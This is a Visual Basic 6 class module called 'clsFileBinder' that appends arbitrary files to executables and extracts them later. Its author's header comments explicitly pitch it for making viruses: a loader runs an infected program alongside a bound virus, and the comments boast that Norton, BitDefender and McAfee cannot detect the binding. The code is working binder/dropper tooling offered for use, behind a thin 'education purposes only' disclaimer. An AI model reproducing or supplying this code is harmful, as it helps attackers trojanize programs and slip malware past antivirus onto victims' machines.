VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "clsFileBinder"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_Ext_KEY = "SavedWithClassBuilder6" ,"Yes"
Attribute VB_Ext_KEY = "Top_Level" ,"Yes"
'================================================================================
'                       FileBinder Class Project
'                            A project by
'                     -=[ Black Tornado Software ]=-
'================================================================================
' This project was completly written by Black Tornado, and it is based
' on Black Tornado's article "Packing File Into Executables Using Property Bag".
'
' This project is very important for Hackers like me, by using this project and
' putting it in your project, you can bind anything to a property then save the
' FBF [FileBinderFile] into an executable, and the class will automaticily bind
' the contents into the file you chosen, I have also included 2 other functions
' which will help you easily bind/extract items, which are : FileToProperty &
' PropertyToFile.
'
' This project will help you very much for making viruses, [YOU MAY ASK HOW???]
' this is done by creating a loader which has this class and the program that is
' infected, then when the loader runs, it will run the infected file with the
' virus, but before doing that you must create a program that will bind the virus
' with the executable, and that is very easy, and it is done by FileBinder.
'
' You may ask: Can norton detect a virus coding???, the answer is NO!!!
' By using FileBinder, Norton & BitDefender & McAffee cannot detect that a file
' was binded to another. THIS DOES NOT MEAN THAT IF YOU BIND AN OLD VIRUS THAT
' IS IN NORTON DATABASE, INTO AN EXECUTABLE THEN NORTON WILL NOT DETECT IT!!!
'
' For more information, please contact me using:
' -=[ Website ]=- -=[   www.BlackTornado.tk    ]=-
' -=[  Email  ]=- -=[ BlackTornado2K@Yahoo.com ]=-
'================================================================================
' Warning: You are free to change the code of this project, but you MUST put the
' original author name, this project is for education purposes only, I am not
' responsible for anything happens to your computer using my project
'================================================================================
' Warning: -=[ Black Tornado Software ]=- & Black Tornado & Black Tornado Logo
' are registered marks of Ahmed Adel's Visual Basic programming project.
'================================================================================


'=====================================================================
'               STRUCTURE OF THE FILE AFTER BINDING:
'=====================================================================
'
'  ****************************************************************
'  *+------------------------------------------------------------+*
'  *|                     ORIGINAL FILE                          |*
'  *+------------------------------------------------------------+*
'  *|              LENGTH OF THE ORIGINAL FILE                   |*
'  *+------------------------------------------------------------+*
'  *|                      BINDED DATA                           |*
'  *+------------------------------------------------------------+*
'  ****************************************************************



Option Explicit                    ' Reminds you if you forget to declare a variable
Public MyFBF As New PropertyBag    ' FileBinderFile Bag
Public Contents As Variant         ' FileBinderFile Contents

Public Sub About()
'================================================================================
' Function      : About
' Description   : Shows the about dialog of FileBinder project
' Returns       : [ None ]
' Example Usage : About
'================================================================================
frmAbout.Show vbModal    ' Shows the about dialog
End Sub

Public Function ReadProperty(ByVal PropertyName As String) As Variant
'================================================================================
' Function      : ReadProperty
' Description   : Reads a property in the current FBF
' Returns       : Property value
' Example Usage : Picture = ReadProperty("Picture")
'================================================================================
On Error Resume Next
ReadProperty = MyFBF.ReadProperty(PropertyName)
End Function

Public Sub WriteProperty(ByVal PropertyName As String, ByVal PropertyValue$)
'================================================================================
' Function      : WriteProperty
' Description   : Writes a value to an existing or new property
' Returns       : [ None ]
' Example Usage : WriteProperty "Picture", Me.Picture
'================================================================================
On Error Resume Next
MyFBF.WriteProperty PropertyName, PropertyValue$
End Sub

Public Function FileToProperty(ByVal FileName As String, ByVal PropertyName As String) As Boolean
'================================================================================
' Function      : FileToProperty
' Description   : Reads a contents of a file to a property
' Returns       : TRUE or FALSE according to the operation
' Example Usage : FileToProperty
'================================================================================
On Error GoTo FBF_Err ' If there is an error, then its a reading error
Dim CurrentLine$, Full$
' CurrentLine$ stores the current readed line
' Full$ stores all the lines
DoEvents
Open FileName For Binary As #1
Full$ = String(LOF(1), Chr(0))
Get #1, , Full$
Close #1
MyFBF.WriteProperty PropertyName, Full$   ' Write the property
FileToProperty = True          ' Function success
Exit Function
FBF_Err:
FileToProperty = False         ' Function Failed
End Function

Public Function PropertyToFile(ByVal PropertyName As String, ByVal FileName As String) As Boolean
'================================================================================
' Function      : PropertyToFile
' Description   : Reads the contents of a property and write it to a file
' Returns       : TRUE or FALSE according to the operation
' Example Usage : PropertyToFile "Readme","C:\Readme.txt"
'================================================================================
Dim Contents$
Contents$ = Me.ReadProperty(PropertyName)
On Error GoTo FBF_Err
Open FileName For Binary As #1
Put #1, , Contents$
Close #1
' We did not face any errors, which means that the operation successed
PropertyToFile = True   ' Function success
Exit Function
FBF_Err:
PropertyToFile = False  ' Function failed
End Function

Public Function SavePackage(ToFile As String) As Boolean
'================================================================================
' Function      : SavePackage
' Description   : Binds the contents of  the current FBF to a file
' Returns       : TRUE or FALSE according to the operation
' Example Usage : SavePackage "C:\Windows\Notepad.exe"
'================================================================================
Dim Temp As Variant            ' Stores the contents
Temp = MyFBF.Contents          ' Temp = Current Contents
Dim Writing_Position As Long   ' Stores the location of ending point in the binded file [Before Binding]
On Error GoTo FBF_Err          ' If there is an error, then it is a writing error
Open ToFile For Binary Access Write As #1
Writing_Position = LOF(1)      ' Writing_Position=LOF[LengthOfFile] ToFile, which is the file before binding it
If LOF(1) = 0 Then GoTo EmptyFile ' It the file is empty, then goto EmptyFile
Seek #1, LOF(1)                ' Seek to the end of file
EmptyFile:                     ' <-- ONLY IF FILE WHICH MUST BE BINDED WITH IS EMPTY
Put #1, , Temp                 ' Put the contents of Temp
Put #1, , Writing_Position     ' Put the original file length
Close #1                       ' Close the file
SavePackage = True             ' Function Success
Exit Function                  ' Exit function
FBF_Err:                       ' WE HAVE AN ERROR
SavePackage = False            ' Operation Failed
End Function

Public Function OpenPackage(ByVal FileBinderFile As String) As Boolean
'================================================================================
' Function      : OpenPackage
' Description   : Opens the contents of a BFB file binded in a file
' Returns       : TRUE or FALSE according to the operation
' Example Usage : Open "C:\Windows\Notepad.exe"
'================================================================================
Dim Extracted_Bag As New PropertyBag     ' The Extracted_Bag [From the binded file]
Dim Reading_Position As Long             ' Start point of binding data
Dim Temp As Variant                      ' Stores the readed data
Dim RealContents() As Byte               ' The real contents [MUST BE BYTE!!!]
On Error GoTo FBF_Err                    ' If we have an error then it is a reading error
Open FileBinderFile For Binary Access Read As #1
Get #1, LOF(1) - 3, Reading_Position     ' Get the original file length [BEFORE BINDING]
Seek #1, Reading_Position                ' Go Reading_Position which is ^
Get #1, , Temp                           ' Get the data to Temp
RealContents = Temp                      ' RealContents = Temp [CONVERTED TO BYTES]
Extracted_Bag.Contents = RealContents    ' Extracted_Bag.Contents = RealContents [Which is extracted from the file]
MyFBF.Contents = Extracted_Bag.Contents  ' MyFBF.Contents [General One in the class] = Extracted_Bag.Contents
Close #1                                 ' Close the file
OpenPackage = True                       ' Function Success
Exit Function                            ' Exit function
FBF_Err:                                 ' WE HAVE AN ERROR
OpenPackage = False                      ' Function Failed
End Function
